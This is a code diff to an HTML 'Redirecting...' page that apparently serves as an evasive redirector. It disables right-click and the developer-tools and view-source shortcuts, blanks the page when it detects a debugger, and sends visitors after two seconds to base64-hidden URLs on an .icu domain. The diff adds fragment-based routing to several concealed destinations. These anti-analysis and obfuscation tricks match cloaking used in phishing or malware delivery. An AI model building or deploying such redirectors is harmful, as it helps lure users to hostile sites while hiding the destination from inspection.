@@ -3,30 +3,30 @@
 <head>
     <meta charset="utf-8">
     <title>Redirecting...</title>
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        min-height: 100vh;
-        background: #fff;
-    }
-    .logo-container {
-        text-align: center;
-        opacity: 0;
-        animation: blink 2.5s ease-in-out infinite; /* Slower blink: full cycle every 2.5s */
-    }
-    .logo-container img {
-        max-width: 200px;
-        height: auto;
-    }
-    @keyframes blink {
-        0%, 100% { opacity: 0; }
-        50%       { opacity: 1; }
-    }
-</style>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #fff;
+        }
+        .logo-container {
+            text-align: center;
+            opacity: 0;
+            animation: blink 2.5s ease-in-out infinite;
+        }
+        .logo-container img {
+            max-width: 200px;
+            height: auto;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 0; }
+            50%       { opacity: 1; }
+        }
+    </style>
 </head>
 <body>
     <div class="logo-container">
@@ -37,37 +37,17 @@
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
         });
-        
+
         // Anti F12 and other dev tools shortcuts
         document.addEventListener('keydown', function(e) {
-            // F12
-            if (e.keyCode === 123) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+Shift+I
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+Shift+J
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+U
-            if (e.ctrlKey && e.keyCode === 85) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+Shift+C
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
-                e.preventDefault();
-                return false;
-            }
+            if (e.keyCode === 123) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) { e.preventDefault(); return false; }
         });
-        
-        // Anti-debug - detects if DevTools is open
+
+        // Anti-debug
         setInterval(function() {
             const start = performance.now();
             debugger;
@@ -76,10 +56,40 @@
                 window.location.href = 'about:blank';
             }
         }, 1000);
-        
-        // Redirect after animation
+
+        // --- Destination routing by fragment ---
+        // Each entry maps a fragment (without '#') to a base64-encoded URL.
+        // Add more entries as needed.
+        var ROUTES = {
+            '1': 'aHR0cDovL3NldnNraW5ucC5pY3UvcmVkaXJlY3Q=',   // default / #1
+            '2': 'aHR0cHM6Ly9zZXZza2lubnAuaWN1L2thbGkvcmVkaXJlYy8='      // #2 -> replace with your real base64
+        };
+
+        function pickDestination() {
+            // Priority 1: current page's own hash (user landed on .../#1 or .../#2)
+            var hash = window.location.hash.replace(/^#/, '');
+
+            // Priority 2: if no hash on this page, try to pull it from referrer
+            // (Referrer itself won't carry a fragment, so this is a fallback
+            //  for the case where the referrer URL was passed as a full string
+            //  by some intermediary — rare, but handled.)
+            if (!hash && document.referrer) {
+                var refHash = document.referrer.split('#')[1];
+                if (refHash) hash = refHash;
+            }
+
+            // Fallback: default route
+            if (!hash || !ROUTES[hash]) hash = '1';
+
+            try {
+                return atob(ROUTES[hash]);
+            } catch (err) {
+                return atob(ROUTES['1']);
+            }
+        }
+
         setTimeout(function() {
-            window.location.href = atob('aHR0cDovL3NldnNraW5ucC5pY3UvcmVkaXJlY3Q=');
+            window.location.href = pickDestination();
         }, 2000);
     </script>
 </body>
